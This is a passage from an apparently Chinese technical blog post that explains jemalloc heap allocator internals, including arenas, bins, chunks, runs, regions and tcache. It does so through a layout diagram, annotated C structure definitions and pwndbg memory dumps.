class="number">0x00007f6ca9a61000</span>)</span><br></pre></td></tr></table></figure>
<p>对于 Jemalloc 堆的调试，最好使用 shadow：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/CENSUS/shadow">CENSUS/shadow： jemalloc heap exploitation framework (github.com)</a> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hl09083253cy/article/details/79147625">使用 GDB 查看 Jemalloc 内存布局</a> </p>
<h2 id="Jemalloc-架构设计"><a href="#Jemalloc-架构设计" class="headerlink" title="Jemalloc 架构设计"></a>Jemalloc 架构设计</h2><img src="/2022/05/31/Jemalloc/1653930266235-1654524704680.png" class width="1653930266235"> 
<p>上图中涉及 jemalloc 的几个核心概念，例如 arena、bin、chunk、run、region、tcache 等，我们下面逐一进行介绍：</p>
<ul>
<li><strong>arena 是 jemalloc 最重要的部分</strong>，内存由一定数量的 arenas 负责管理，每个用户线程都会被绑定到一个 arena 上，线程采用 round-robin 轮询的方式选择可用的 arena 进行内存分配，为了减少线程之间的锁竞争，默认每个 CPU 会分配 4 个 arena</li>
<li><strong>bin 用于管理不同档位的内存单元</strong>，每个 bin 管理的内存大小是按分类依次递增，因为 jemalloc 中小内存的分配是基于 Slab 算法完成的，所以会产生不同类别的内存块</li>
<li><strong>chunk 是负责管理用户内存块的数据结构</strong>，chunk 以 Page 为单位管理内存，默认大小是 4M，即 1024 个连续 Page，每个 chunk 可被用于多次小内存的申请，但是在大内存分配的场景下只能分配一次</li>
<li><strong>run 实际上是 chunk 中的一块内存区域</strong>，每个 bin 管理相同类型的 run，最终通过操作 run 完成内存分配，run 结构具体的大小由不同的 bin 决定（例如 8 字节的 bin 对应的 run 只有一个 Page，可以从中选取 8 字节的块分配给 regions）</li>
<li><strong>region 是每个 run 中的对应的若干个小内存块</strong>，每个 run 会将划分为若干个等长的 region，每次内存分配也是按照 region 进行分发</li>
<li><strong>tcache 是每个线程私有的缓存</strong>，用于 small 和 large 场景下的内存分配，每个 tcahe 会对应一个 arena，tcache 本身也会有一个 bin 数组，称为tbin，与 arena 中 bin 不同的是，它不会有 run 的概念，tcache 每次从 arena 申请一批内存，在分配内存时首先在 tcache 查找，从而避免锁竞争，如果分配失败才会通过 run 执行内存分配</li>
</ul>
<p>重新梳理下它们之间的关系：</p>
<ul>
<li>内存是由一定数量的 arenas 负责管理，线程均匀分布在 arenas 当中</li>
<li>每个 arena 都包含一个 bin 数组，每个 bin 管理不同档位的内存块</li>
<li>每个 arena 被划分为若干个 chunks，每个 chunk 又包含若干个 runs，每个 run 由连续的 Page 组成，run 才是实际分配内存的操作对象</li>
<li>每个 run 会被划分为一定数量的 regions，在小内存的分配场景，region 相当于用户内存</li>
<li>每个 tcache 对应 一个 arena，tcache 中包含多种类型的 bin</li>
</ul>
<p>简单来说：首先是 arena 是最顶层的，会有多个 arena 结构（一般是一个线程对应一个），arena 内储存 chunk，每个 chunk 大小为 4M，chunk 被分为 run，run 内是 region（用户分配到的数据）</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  Chunk <span class="comment">#0                           Chunk #1</span></span><br><span class="line">.--------------------------------. .--------------------------------.</span><br><span class="line">|<span class="string">   Run #0         Run #1        </span>|<span class="string"> </span>|<span class="string">   Run #0         Run #1        </span>|</span><br><span class="line">|<span class="string"> .-------------..-------------. </span>|<span class="string"> </span>|<span class="string"> .-------------..-------------. </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string">   Page      </span>||<span class="string">   Page      </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   Page      </span>||<span class="string">   Page      </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> .---------. </span>||<span class="string"> .---------. </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> .---------. </span>||<span class="string"> .---------. </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> Regions </span>|<span class="string"> </span>||<span class="string"> </span>|<span class="string"> Regions </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> Regions </span>|<span class="string"> </span>||<span class="string"> </span>|<span class="string"> Regions </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">	...</span></span><br><span class="line"><span class="string"></span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">[] [] [] </span>|<span class="string"> </span>||<span class="string"> </span>|<span class="string">[] [] [] </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">[] [] [] </span>|<span class="string"> </span>||<span class="string"> </span>|<span class="string">[] [] [] </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> </span>|<span class="string"> `-</span>|<span class="string">-----</span>|<span class="string">-&#x27; </span>||<span class="string"> `---------&#x27; </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> `-</span>|<span class="string">-----</span>|<span class="string">-&#x27; </span>||<span class="string"> `---------&#x27; </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string"> `---</span>|<span class="string">-----</span>|<span class="string">---&#x27;`-------------&#x27; </span>|<span class="string"> </span>|<span class="string"> `---</span>|<span class="string">-----</span>|<span class="string">---&#x27;`-------------&#x27; </span>|</span><br><span class="line">`-----|<span class="string">-----</span>|<span class="string">--------------------&#x27; `-----</span>|<span class="string">-----</span>|<span class="string">--------------------&#x27;</span></span><br><span class="line"><span class="string">      </span>|<span class="string">     </span>|<span class="string">                            </span>|<span class="string">     </span>|</span><br><span class="line">  .---|<span class="string">-----</span>|<span class="string">----------.             .---</span>|<span class="string">-----</span>|<span class="string">----------.</span></span><br><span class="line"><span class="string">  </span>|<span class="string"> free regions&#x27; tree </span>|<span class="string"> ...         </span>|<span class="string"> free regions&#x27; tree </span>|<span class="string"> ...</span></span><br><span class="line"><span class="string">  `--------------------&#x27;             `--------------------&#x27;</span></span><br><span class="line"><span class="string">  bin[Chunk #0][Run #0]              bin[Chunk #1][Run #0]</span></span><br></pre></td></tr></table></figure>
<h2 id="Jemalloc-数据结构"><a href="#Jemalloc-数据结构" class="headerlink" title="Jemalloc 数据结构"></a>Jemalloc 数据结构</h2><p><strong>arena_t</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_s</span> <span class="title">arena_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_s</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_DEBUG</span></span><br><span class="line">	<span class="keyword">uint32_t</span>		magic;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> ARENA_MAGIC 0x947d3d24</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">unsigned</span>		ind; <span class="comment">/* 这个arena在arenas数组中的索引 */</span></span><br><span class="line">	<span class="keyword">unsigned</span>		nthreads; <span class="comment">/* 当前分配给此竞技场的线程数(该字段受arenas_lock保护) */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    arena的锁操作分为三类:</span></span><br><span class="line"><span class="comment">    1.线程分配(修改nthreads): 受arenas_lock保护</span></span><br><span class="line"><span class="comment">    2.与bin相关的操作: 受到bin锁的保护</span></span><br><span class="line"><span class="comment">    3.与chunk和run相关的操作: 受此互斥锁保护</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">malloc_mutex_t</span>		lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_STATS</span></span><br><span class="line">	<span class="keyword">arena_stats_t</span>		stats;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">ifdef</span> JEMALLOC_TCACHE</span></span><br><span class="line">	ql_head(<span class="keyword">tcache_t</span>)	tcache_ql; <span class="comment">/* 与此arena关联的现有线程的tcache列表(来自这些的统计信息会逐渐合并,并在退出时合并) */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_PROF</span></span><br><span class="line">	<span class="keyword">uint64_t</span>		prof_accumbytes;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">	ql_head(<span class="keyword">arena_chunk_t</span>)	chunks_dirty; <span class="comment">/* 此arena管理的&quot;包含脏页的块&quot;列表 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    为了避免当竞技场在需要新块的风口浪尖时快速分配/释放,spare(备用块)用于缓存最近释放的块</span></span><br><span class="line"><span class="comment">    spare将留在竞技场的chunk树中,直到它被删除</span></span><br><span class="line"><span class="comment">    每个arena都有一个spare(以避免多个线程之间的交互),这可能使单个spare不足</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">arena_chunk_t</span>		*spare; </span><br><span class="line">	<span class="keyword">size_t</span>			nactive; <span class="comment">/* active run(已使用的run)的页数 */</span></span><br><span class="line">	<span class="keyword">size_t</span>			ndirty; <span class="comment">/* 当前未使用的run中,可能脏的页面计数(通过跟踪这一点,我们可以限制为每个arena映射脏内存的多少) */</span></span><br><span class="line">	<span class="keyword">size_t</span>			npurgatory; <span class="comment">/* 正在清除的大概页数(多个线程可以同时清除脏页,它们使用npurgatory来指示所有线程试图清除的页面总数) */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    runs_avail_clean用于执行最适合的run分配,干净树包含的run的page要么没有关联的物理页面,要么具有内核可以随时回收的页面</span></span><br><span class="line"><span class="comment">    runs_avail_dirty脏树包含带有脏页的run(即很可能已被触及并因此具有关联的物理页面)</span></span><br><span class="line"><span class="comment">    脏树优先于清洁树进行分配,因为使用脏页减少了将活动: 脏页比率保持在清除阈值以下所需的脏清除量</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">	<span class="keyword">arena_avail_tree_t</span>	runs_avail_clean; <span class="comment">/* 此竞技场可用run的大小/地址排序树 */</span></span><br><span class="line">	<span class="keyword">arena_avail_tree_t</span>	runs_avail_dirty; <span class="comment">/* 脏树包含带有脏页的run */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * bins用于存储以下大小的自由区域的树:</span></span><br><span class="line"><span class="comment">	 * 假设: 64位系统, 具有16字节quantum, 4KB页面大小, 默认MALLOC_CONF</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 *   bins[i] |   size |</span></span><br><span class="line"><span class="comment">	 *   --------+--------+</span></span><br><span class="line"><span class="comment">	 *        0  |      8 |</span></span><br><span class="line"><span class="comment">	 *   --------+--------+</span></span><br><span class="line"><span class="comment">	 *        1  |     16 |</span></span><br><span class="line"><span class="comment">	 *        2  |     32 |</span></span><br><span class="line"><span class="comment">	 *        3  |     48 |</span></span><br><span class="line"><span class="comment">	 *           :        :</span></span><br><span class="line"><span class="comment">	 *        6  |     96 |</span></span><br><span class="line"><span class="comment">	 *        7  |    112 |</span></span><br><span class="line"><span class="comment">	 *        8  |    128 |</span></span><br><span class="line"><span class="comment">	 *   --------+--------+</span></span><br><span class="line"><span class="comment">	 *        9  |    192 |</span></span><br><span class="line"><span class="comment">	 *       10  |    256 |</span></span><br><span class="line"><span class="comment">	 *       11  |    320 |</span></span><br><span class="line"><span class="comment">	 *       12  |    384 |</span></span><br><span class="line"><span class="comment">	 *       13  |    448 |</span></span><br><span class="line"><span class="comment">	 *       14  |    512 |</span></span><br><span class="line"><span class="comment">	 *   --------+--------+</span></span><br><span class="line"><span class="comment">	 *       15  |    768 |</span></span><br><span class="line"><span class="comment">	 *       16  |   1024 |</span></span><br><span class="line"><span class="comment">	 *       17  |   1280 |</span></span><br><span class="line"><span class="comment">	 *           :        :</span></span><br><span class="line"><span class="comment">	 *       25  |   3328 |</span></span><br><span class="line"><span class="comment">	 *       26  |   3584 |</span></span><br><span class="line"><span class="comment">	 *       27  |   3840 |</span></span><br><span class="line"><span class="comment">	 *   --------+--------+</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">arena_bin_t</span>		bins[<span class="number">1</span>]; <span class="comment">/* bins的动态大小 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于描述 Arenas 的结构体</li>
</ul>
<p><strong>arena_chunk_t</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_chunk_s</span> <span class="title">arena_chunk_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Arena chunk header. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_chunk_s</span> &#123;</span></span><br><span class="line">	<span class="keyword">arena_t</span>		*arena; <span class="comment">/* 指向拥有该chunk的arena */</span></span><br><span class="line">	ql_elm(<span class="keyword">arena_chunk_t</span>) link_dirty; <span class="comment">/* arena的chunk_dirty列表的链接 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span>		dirtied; <span class="comment">/* 如果当前chunk在chunks_dirty列表中,则为真 */</span></span><br><span class="line">	<span class="keyword">size_t</span>		ndirty; <span class="comment">/* 脏页的数目 */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">arena_chunk_map_t</span> <span class="built_in">map</span>[<span class="number">1</span>]; <span class="comment">/* map的动态大小 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于描述 Chunk 的结构体</li>
<li>块映射与块的内存对齐结合的主要用途是：实现对空闲和大/小堆分配（区域）的管理元数据的恒定时间访问</li>
</ul>
<p><strong>arena_bin_t</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_bin_s</span> <span class="title">arena_bin_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_bin_s</span> &#123;</span></span><br><span class="line">	<span class="keyword">malloc_mutex_t</span>	lock; <span class="comment">/* runcur,runs和stats上的所有操作都需要锁定该锁(run分配/解除分配受arena锁保护,可以在持有一个或多个bin锁时获取,但反之则不然) */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">arena_run_t</span>	*runcur; <span class="comment">/* 表示服务于此bin的run(对应arena_run_t结构体的地址) */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	当runcur不再可用,需要查找现有run时才使用此树(我们选择内存最低的非完整运行)</span></span><br><span class="line"><span class="comment">	这个策略倾向于保持对象打包好,它还可以帮助减少几乎空的块的数量</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">arena_run_tree_t</span> runs; <span class="comment">/* 与bin相关运行的树(非完整运行树) */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_STATS</span></span><br><span class="line">	<span class="keyword">malloc_bin_stats_t</span> stats; <span class="comment">/* Bin统计信息 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于描述 Bins 的结构体</li>
<li>每个 bin 都有一个关联的大小类别，并存储/管理该类别的区域大小类</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7800c30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7800c30</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7800c38</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7800c40</span> ◂— <span class="number">0x200</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7800c48</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff7800c50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7800c58</span> —▸ <span class="number">0x7ffff7006000</span> ◂— <span class="number">0x384adf93</span> <span class="comment">// runcur</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7800c60</span> —▸ <span class="number">0x7ffff7800c68</span> ◂— <span class="number">0x7ffff7800c68</span> <span class="comment">// runs</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7800c68</span> ◂— <span class="number">0x7ffff7800c68</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; p (<span class="keyword">arena_bin_t</span>)*<span class="number">0x7ffff7800c30</span></span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  lock = &#123;</span><br><span class="line">    __data = &#123;</span><br><span class="line">      __lock = <span class="number">0</span>,</span><br><span class="line">      __count = <span class="number">0</span>,</span><br><span class="line">      __owner = <span class="number">0</span>,</span><br><span class="line">      __nusers = <span class="number">0</span>,</span><br><span class="line">      __kind = <span class="number">512</span>,</span><br><span class="line">      __spins = <span class="number">0</span>,</span><br><span class="line">      __elision = <span class="number">0</span>,</span><br><span class="line">      __list = &#123;</span><br><span class="line">        __prev = <span class="number">0x0</span>,</span><br><span class="line">        __next = <span class="number">0x0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __size = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">17</span> times&gt;, <span class="string">&quot;\002&quot;</span>, <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">21</span> times&gt;,</span><br><span class="line">    __align = <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  runcur = <span class="number">0x7ffff7006000</span>,</span><br><span class="line">  runs = &#123; <span class="comment">/* 这是一个&quot;树结构&quot; */</span></span><br><span class="line">    rbt_root = <span class="number">0x7ffff7800c68</span>,</span><br><span class="line">    rbt_nil = &#123;</span><br><span class="line">      u = &#123;</span><br><span class="line">        rb_link = &#123;</span><br><span class="line">          rbn_left = <span class="number">0x7ffff7800c68</span>,</span><br><span class="line">          rbn_right_red = <span class="number">0x7ffff7800c68</span></span><br><span class="line">        &#125;,</span><br><span class="line">        ql_link = &#123;</span><br><span class="line">          qre_next = <span class="number">0x7ffff7800c68</span>,</span><br><span class="line">          qre_prev = <span class="number">0x7ffff7800c68</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      bits = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>arena_bin_info_t</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_bin_info_s</span> <span class="title">arena_bin_info_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_bin_info_s</span> &#123;</span></span><br><span class="line">	<span class="keyword">size_t</span>		reg_size; <span class="comment">/* 属于该bin的,run所对应的区域大小 */</span></span><br><span class="line">	<span class="keyword">size_t</span>		run_size; <span class="comment">/* 此bin对应的,run的大小 */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nregs; <span class="comment">/* 此bin对应的,run的区域总数 */</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint32_t</span>	bitmap_offset; <span class="comment">/* 此bin对应的,run标头中第一个bitmap_t元素的偏移量 */</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">bitmap_info_t</span>	bitmap_info; <span class="comment">/* 用于操作与此bin关联的run的位图的元数据 */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_PROF</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	ctx0_offset; <span class="comment">/* 此bin对应的,run标头中第一个(prof_ctx_t *)的偏移量,如果(opt_prof==false)则为&#x27;0&#x27; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">uint32_t</span>	reg0_offset; <span class="comment">/* 此bin对应的,run中第一个区域的偏移量 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于阐释 Bins 的信息</li>
</ul>
<p><strong>arena_run_t</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> <span class="title">arena_run_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arena_run_s</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> JEMALLOC_DEBUG</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	magic;</span><br><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> ARENA_RUN_MAGIC 0x384adf93</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">arena_bin_t</span>	*bin; <span class="comment">/* 与此run关联的bin */</span></span><br><span class="line">	<span class="keyword">uint32_t</span>	nextind; <span class="comment">/* 下一个从未分配过的区域或nregs的索引 */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	nfree; <span class="comment">/* run中的空闲区域数 */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 本次运行中区域的位掩码,每个位对应一个区域,&#x27;0&#x27;表示该区域已使用,&#x27;1&#x27;位值表示相应区域空闲,变量nextind是该数组的第一个非零元素的索引 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> regs_mask[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>用于描述 Runs 的结构体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7006000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7006000</span> ◂— <span class="number">0x384adf93</span> <span class="comment">// magic</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7006008</span> —▸ <span class="number">0x7ffff7800c30</span> ◂— <span class="number">0x0</span> <span class="comment">// bin</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7006010</span> ◂— <span class="number">0xfa00000002</span> <span class="comment">// nextind &amp; nfree</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7006018</span> ◂— <span class="number">0xfffffffffffffffc</span> <span class="comment">// regs_mask</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffff7006020</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffff7006028</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffff7006030</span> ◂— <span class="number">0xfffffffffffffff</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffff7006038</span> ◂— <span class="number">0xf</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; p (<span class="keyword">arena_run_t</span>)*<span class="number">0x7ffff7006000</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  magic = <span class="number">944430995</span>,</span><br><span class="line">  bin = <span class="number">0x7ffff7800c30</span>,</span><br><span class="line">  nextind = <span class="number">2</span>,</span><br><span class="line">  nfree = <span class="number">250</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>extent_node_t</strong></p>
